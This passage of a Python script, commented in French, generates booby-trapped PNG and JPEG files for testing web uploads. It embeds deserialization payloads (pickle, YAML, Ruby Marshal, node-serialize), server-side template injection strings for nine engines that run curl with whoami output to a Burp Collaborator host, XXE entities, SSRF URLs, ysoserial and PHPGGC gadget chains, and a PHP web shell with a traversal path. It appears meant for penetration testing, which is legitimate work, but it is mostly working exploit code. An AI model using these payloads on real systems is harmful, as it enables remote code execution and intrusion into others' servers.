        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-python-pickle avec header X-RCE-Proof
        # L'application Python doit appeler pickle.loads() sur cette valeur pour que la RCE se déclenche
        if should_generate(['python', 'all']) and should_generate_type('deserialization'):
            img_path = rce_dir / "rce26_python_pickle_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                pickle_payload_b64 = generate_python_pickle_for_png(burp_collab)
                if pickle_payload_b64:
                    serialize_payload = pickle_payload_b64
                else:
                    serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
            else:
                serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce27_python_yaml_text.png - Python YAML deserialization
        # BACKEND: python
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-python-yaml avec header X-RCE-Proof
        # L'application Python doit appeler yaml.load() sur cette valeur pour que la RCE se déclenche
        if should_generate(['python', 'all']) and should_generate_type('deserialization'):
            img_path = rce_dir / "rce27_python_yaml_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                yaml_payload = generate_python_yaml_for_png(burp_collab)
                if yaml_payload:
                    serialize_payload = yaml_payload
                else:
                    serialize_payload = '!!python/object/apply:os.system ["id"]'
            else:
                serialize_payload = '!!python/object/apply:os.system ["id"]'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce28_ruby_marshal_text.png - Ruby Marshal deserialization
        # BACKEND: ruby
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-ruby-marshal avec header X-RCE-Proof
        # L'application Ruby doit appeler Marshal.load() sur cette valeur pour que la RCE se déclenche
        if should_generate(['ruby', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce28_ruby_marshal_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                marshal_payload_b64 = generate_ruby_marshal_for_png(burp_collab)
                if marshal_payload_b64:
                    serialize_payload = marshal_payload_b64
                else:
                    serialize_payload = 'BAh7BjoKc3lzdGVtKCJpZCIpBjoK'
            else:
                serialize_payload = 'BAh7BjoKc3lzdGVtKCJpZCIpBjoK'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce29_ruby_yaml_text.png - Ruby YAML deserialization
        # BACKEND: ruby
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-ruby-yaml avec header X-RCE-Proof
        # L'application Ruby doit appeler YAML.load() sur cette valeur pour que la RCE se déclenche
        if should_generate(['ruby', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce29_ruby_yaml_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                yaml_payload = generate_ruby_yaml_for_png(burp_collab)
                if yaml_payload:
                    serialize_payload = yaml_payload
                else:
                    serialize_payload = '--- !ruby/object:Gem::Installer\nno_wrapper: true'
            else:
                serialize_payload = '--- !ruby/object:Gem::Installer\nno_wrapper: true'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce30_nodejs_serialize_text.png - Node.js serialize deserialization
        # BACKEND: nodejs
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-nodejs-serialize avec header X-RCE-Proof
        # L'application Node.js doit appeler unserialize() sur cette valeur pour que la RCE se déclenche
        if should_generate(['nodejs', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce30_nodejs_serialize_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                serialize_payload_str = generate_nodejs_serialize_for_png(burp_collab)
                if serialize_payload_str:
                    serialize_payload = serialize_payload_str
                else:
                    serialize_payload = '{"_$$ND_FUNC$$_function":"require(\'child_process\').exec(\'id\')"}'
            else:
                serialize_payload = '{"_$$ND_FUNC$$_function":"require(\'child_process\').exec(\'id\')"}'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce31_ssti_jinja2_text.png - Server-Side Template Injection (Jinja2)
        # BACKEND: python (Jinja2)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-ssti-jinja2
        # L'application doit parser ce template avec Jinja2 pour que la RCE se déclenche
        if should_generate(['python', 'all']) and should_generate_type('ssti') and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce31_ssti_jinja2_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                ssti_payload = generate_ssti_payload('jinja2', f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-jinja2", burp_collab)
            else:
                ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-jinja2").read()}}}}'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = ssti_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
        
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # Génération de tous les payloads SSTI pour PNG tEXt
        if should_generate_type('ssti') and (should_generate_type('rce') or should_generate_type('deserialization')) and (should_generate(['python', 'all']) or should_generate(['java', 'all']) or should_generate(['php', 'all']) or should_generate(['nodejs', 'all']) or should_generate(['ruby', 'all'])):
            ssti_engines = {
                'jinja2': 'python',
                'mako': 'python',
                'freemarker': 'java',
                'velocity': 'java',
                'twig': 'php',
                'smarty': 'php',
                'erb': 'ruby',
                'handlebars': 'nodejs',
                'ejs': 'nodejs'
            }
            
            for engine, backend in ssti_engines.items():
                if should_generate([backend, 'all']):
                    if PAYLOAD_GENERATOR_AVAILABLE:
                        ssti_payload = generate_ssti_payload(engine, f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-{engine}", burp_collab)
                    else:
                        if engine == 'jinja2':
                            ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}").read()}}}}'
                        elif engine == 'mako':
                            ssti_payload = f'${{__import__("os").system("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}")}}'
                        elif engine == 'freemarker':
                            ssti_payload = f'<#assign ex="freemarker.template.utility.Execute"?new()> ${{ex("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}")}}'
                        elif engine == 'velocity':
                            ssti_payload = f'#set($x=$class.forName("java.lang.Runtime").getRuntime().exec("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}"))'
                        elif engine == 'twig':
                            ssti_payload = f'{{{{["/bin/sh","-c","curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}"]|filter("system")}}}}'
                        elif engine == 'smarty':
                            ssti_payload = f'{{{{system("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}")}}}}'
                        elif engine == 'erb':
                            ssti_payload = f'<%= system("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}") %>'
                        elif engine == 'handlebars':
                            ssti_payload = f'{{{{#with "s" as |string|}}}}{{{{ "require" "child_process" "exec" "curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}"}}}}'
                        elif engine == 'ejs':
                            ssti_payload = f'<%= global.process.mainModule.require("child_process").exec("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-{engine}") %>'
                        else:
                            continue
                    
                    img_path = rce_dir / f"rce_ssti_{engine}_text.png"
                    img.save(img_path, 'PNG')
                    with open(img_path, 'rb') as f:
                        png_data = bytearray(f.read())
                    
                    text_chunk_type = b'tEXt'
                    text_keyword = b'Comment'
                    text_value = ssti_payload.encode('utf-8')
                    text_chunk_data = text_keyword + b'\x00' + text_value
                    text_chunk_length = struct.pack('>I', len(text_chunk_data))
                    text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
                    text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
                
                    iend_pos = png_data.rfind(b'IEND')
                    if iend_pos != -1:
                        iend_chunk_start = iend_pos - 4
                        png_data[iend_chunk_start:iend_chunk_start] = text_chunk
                
                    with open(img_path, 'wb') as f:
                        f.write(png_data)
    
    if ext == 'jpg' or ext == 'jpeg':
        img = Image.new('RGB', (100, 100), color='red')
        # XXE: xxe2_xmp_app1.jpg - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe2_xmp_app1.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            xxe_xmp = f'''<?xml version="1.0"?>
            <!DOCTYPE x [
            <!ENTITY % x SYSTEM "{base_url}/xxe-xmp-app1">
            %x;
            ]>
            <x:xmpmeta xmlns:x="adobe:ns:meta/">
            <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
            <rdf:Description rdf:about="">
            <dc:title>test</dc:title>
            </rdf:Description>
            </rdf:RDF>
            </x:xmpmeta>'''.encode('utf-8')
        
            app1_marker = b'\xFF\xE1'
            app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
            app1_length = struct.pack('>H', len(xxe_xmp) + len(app1_identifier) + 2)
            app1_chunk = app1_marker + app1_length + app1_identifier + xxe_xmp
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = app1_chunk
        
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce23_unserialize_exif.jpg - PHP unserialize() avec gadget chain (Monolog/RCE1)
        # BACKEND: php
        # DETECTION: Out-of-band via Burp Collaborator OU reflection dans la réponse
        # OBSERVER: Si gadget chain exécute du code, vérifier les logs serveur ou requêtes vers burp_collab
        # Le payload contient un objet sérialisé qui sera désérialisé et exécuté
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        # Alternative: utiliser un gadget qui modifie un header de réponse pour prouver la RCE
        if should_generate(['php', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce23_unserialize_exif.jpg"
            img.save(img_path, 'JPEG')
            
            from PIL.ExifTags import TAGS
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                phpggc_payload = generate_phpggc_for_jpeg_exif(burp_collab, 'Monolog/RCE1')
                if phpggc_payload:
                    serialize_payload = phpggc_payload
                else:
                    serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
            else:
                serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
            
            try:
                exif_dict = img.getexif()
                exif_dict[270] = serialize_payload
                exif_dict[315] = serialize_payload
                img.save(img_path, 'JPEG', exif=exif_dict.tobytes() if hasattr(exif_dict, 'tobytes') else None)
            except:
                pass
        
        # Génération de tous les payloads PHPGGC pour JPEG EXIF
        if should_generate(['php', 'all']) and PAYLOAD_GENERATOR_AVAILABLE and (should_generate_type('rce') or should_generate_type('deserialization')):
            try:
                phpggc_all_payloads = generate_phpggc_all_for_jpeg_exif(burp_collab)
                for gadget, phpggc_payload in phpggc_all_payloads.items():
                    if not phpggc_payload:
                        continue
                    
                    gadget_safe = gadget.replace('/', '_').replace('\\', '_').lower()
                    img_path = rce_dir / f"rce_phpggc_{gadget_safe}_exif.jpg"
                    img.save(img_path, 'JPEG')
                    
                    from PIL.ExifTags import TAGS
                    
                    try:
                        exif_dict = img.getexif()
                        exif_dict[270] = phpggc_payload
                        exif_dict[315] = phpggc_payload
                        img.save(img_path, 'JPEG', exif=exif_dict.tobytes() if hasattr(exif_dict, 'tobytes') else None)
                    except:
                        pass
            except Exception as e:
                pass
        
        # SSRF: ssrf22_icc_profile.jpg - SSRF via ICC profile URL
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Le parser ICC va faire une requête HTTP pour récupérer le profil ICC
        # Vérifier dans Burp Collaborator: requête HTTP GET reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf22_icc_profile.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            icc_url = f'http://{burp_collab}/ssrf-icc'
            icc_marker = b'\xFF\xE2'
            icc_identifier = b'ICC_PROFILE\x00'
            icc_payload = f'URL:{icc_url}'.encode('utf-8')
            icc_length = struct.pack('>H', len(icc_identifier) + len(icc_payload) + 2)
            icc_chunk = icc_marker + icc_length + icc_identifier + icc_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = icc_chunk
        
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce32_ysoserial_net_xmp.jpg - .NET deserialization avec ysoserial.net (ObjectDataProvider)
        # BACKEND: dotnet
        # DETECTION: Out-of-band via Burp Collaborator
        # COMMENT ÇA MARCHE:
        # 1. L'application .NET backend lit le XMP dans le JPEG APP1 segment
        # 2. Elle extrait le payload ysoserial.net (objet .NET sérialisé) du XMP
        # 3. Elle désérialise le payload: BinaryFormatter.Deserialize() ou ObjectDataProvider
        # 4. Le gadget chain ysoserial.net s'exécute et appelle: Process.Start("curl -H 'X-RCE-Proof: $(whoami)' http://burp_collab/rce-ysoserial-net")
        # 5. La commande curl s'exécute et fait une requête HTTP vers Burp Collaborator avec le header X-RCE-Proof
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-ysoserial-net avec header X-RCE-Proof contenant la sortie de whoami
        # Vérifier dans Burp Collaborator: requête HTTP reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['dotnet', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce32_ysoserial_net_xmp.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                ysoserial_net_b64 = generate_ysoserial_net_for_jpeg(burp_collab, 'ObjectDataProvider')
                if ysoserial_net_b64:
                    xmp_ysoserial_net = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{ysoserial_net_b64}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
                else:
                    ysoserial_net_payload = b'\x00\x01\x00\x00\x00'
                    xmp_ysoserial_net = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>ysoserial.net:{ysoserial_net_payload.hex()}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
            else:
                ysoserial_net_payload = b'\x00\x01\x00\x00\x00'
                xmp_ysoserial_net = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>ysoserial.net:{ysoserial_net_payload.hex()}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
            
            app1_marker = b'\xFF\xE1'
            app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
            app1_length = struct.pack('>H', len(xmp_ysoserial_net) + len(app1_identifier) + 2)
            app1_chunk = app1_marker + app1_length + app1_identifier + xmp_ysoserial_net
            
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = app1_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # Génération de tous les payloads ysoserial.net pour JPEG XMP
        if should_generate(['dotnet', 'all']) and PAYLOAD_GENERATOR_AVAILABLE:
            try:
                ysoserial_net_all_payloads = generate_ysoserial_net_all_for_jpeg(burp_collab)
                for formatter, ysoserial_net_b64 in ysoserial_net_all_payloads.items():
                    if not ysoserial_net_b64:
                        continue
                    
                    formatter_safe = formatter.lower()
                    img_path = rce_dir / f"rce_ysoserial_net_{formatter_safe}_xmp.jpg"
                    img.save(img_path, 'JPEG')
                    with open(img_path, 'rb') as f:
                        jpg_data = bytearray(f.read())
                    
                    xmp_ysoserial_net = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{ysoserial_net_b64}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
                    
                    app1_marker = b'\xFF\xE1'
                    app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
                    app1_length = struct.pack('>H', len(xmp_ysoserial_net) + len(app1_identifier) + 2)
                    app1_chunk = app1_marker + app1_length + app1_identifier + xmp_ysoserial_net
                    
                    soi_pos = jpg_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        jpg_data[insert_pos:insert_pos] = app1_chunk
                    
                    with open(img_path, 'wb') as f:
                        f.write(jpg_data)
            except Exception as e:
                pass
        
        # SSRF: ssrf23_gps_geourl.jpg - SSRF via EXIF GPS GeoURL
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Le parser EXIF va faire une requête HTTP pour récupérer l'URL GeoURL
        # Vérifier dans Burp Collaborator: requête HTTP GET reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf23_gps_geourl.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            gps_url = f'geo:0,0?q=http://{burp_collab}/ssrf-gps'
            gps_marker = b'\xFF\xE0'
            gps_payload = gps_url.encode('utf-8')
            gps_length = struct.pack('>H', len(gps_payload) + 2)
            gps_chunk = gps_marker + gps_length + gps_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
            jpg_data[insert_pos:insert_pos] = gps_chunk
        
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce24_exiftool_djvu.jpg - ExifTool DjVu polyglotte (CVE-2021-22204)
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: ExifTool va parser le fichier DjVu et exécuter du code Perl
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        # Le payload contient du code Perl qui sera exécuté lors du parsing
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce24_exiftool_djvu.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            djvu_header = b'AT&TFORM\x00\x00\x00\x00DJVI'
            djvu_payload = b'FORM\x00\x00\x00\x00DJVI'
            com_marker = b'\xFF\xFE'
            com_payload = djvu_header + djvu_payload
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # RCE: rce25_ysoserial_xmp.jpg - Java deserialization avec ysoserial gadget (CommonsCollections1)
        # BACKEND: java
        # DETECTION: Out-of-band via Burp Collaborator
        # COMMENT ÇA MARCHE:
        # 1. L'application Java backend lit le XMP dans le JPEG APP1 segment
        # 2. Elle extrait le payload ysoserial (objet Java sérialisé) du XMP
        # 3. Elle désérialise le payload: ObjectInputStream.readObject()
        # 4. Le gadget chain ysoserial s'exécute et appelle: Runtime.getRuntime().exec("curl -H 'X-RCE-Proof: $(whoami)' http://burp_collab/rce-ysoserial")
        # 5. La commande curl s'exécute et fait une requête HTTP vers Burp Collaborator avec le header X-RCE-Proof
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-ysoserial avec header X-RCE-Proof contenant la sortie de whoami
        # Vérifier dans Burp Collaborator: requête HTTP reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['java', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
            img_path = rce_dir / "rce25_ysoserial_xmp.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                ysoserial_b64 = generate_ysoserial_for_jpeg(burp_collab, 'CommonsCollections1')
                if ysoserial_b64:
                    xmp_ysoserial = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{ysoserial_b64}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
                else:
                    ysoserial_payload = b'\xac\xed\x00\x05\x73\x72\x00'
                    xmp_ysoserial = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>ysoserial:{ysoserial_payload.hex()}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
            else:
                ysoserial_payload = b'\xac\xed\x00\x05\x73\x72\x00'
                xmp_ysoserial = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>ysoserial:{ysoserial_payload.hex()}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
            
            app1_marker = b'\xFF\xE1'
            app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
            app1_length = struct.pack('>H', len(xmp_ysoserial) + len(app1_identifier) + 2)
            app1_chunk = app1_marker + app1_length + app1_identifier + xmp_ysoserial
            
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = app1_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # Génération de tous les payloads ysoserial pour JPEG XMP
        if should_generate(['java', 'all']) and PAYLOAD_GENERATOR_AVAILABLE:
            try:
                ysoserial_all_payloads = generate_ysoserial_all_for_jpeg(burp_collab)
                for gadget, ysoserial_b64 in ysoserial_all_payloads.items():
                    if not ysoserial_b64:
                        continue
                    
                    gadget_safe = gadget.lower().replace('commonscollections', 'cc')
                    img_path = rce_dir / f"rce_ysoserial_{gadget_safe}_xmp.jpg"
                    img.save(img_path, 'JPEG')
                    with open(img_path, 'rb') as f:
                        jpg_data = bytearray(f.read())
                    
                    xmp_ysoserial = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{ysoserial_b64}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
                    
                    app1_marker = b'\xFF\xE1'
                    app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
                    app1_length = struct.pack('>H', len(xmp_ysoserial) + len(app1_identifier) + 2)
                    app1_chunk = app1_marker + app1_length + app1_identifier + xmp_ysoserial
                    
                    soi_pos = jpg_data.find(b'\xFF\xD8')
                    if soi_pos != -1:
                        insert_pos = soi_pos + 2
                        jpg_data[insert_pos:insert_pos] = app1_chunk
                    
                    with open(img_path, 'wb') as f:
                        f.write(jpg_data)
            except Exception as e:
                pass
        
        # RCE: rce26_php_exif_lfi.jpg - PHP code injection dans EXIF + LFI chain
        # DETECTION: Out-of-band via Burp Collaborator OU code exécuté visible
        # OBSERVER: Le payload contient du code PHP dans les métadonnées EXIF qui sera inclus via LFI
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        # Alternative: utiliser un payload qui affiche du texte dans la réponse HTTP
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce26_php_exif_lfi.jpg"
            img.save(img_path, 'JPEG')
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            php_lfi_payload = '<?php system($_GET["cmd"]); ?>'
            lfi_path = '../../../../var/www/html/shell.php'
            com_marker = b'\xFF\xFE'
            com_payload = f'Comment: {php_lfi_payload}\nPath: {lfi_path}'.encode('utf-8')
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
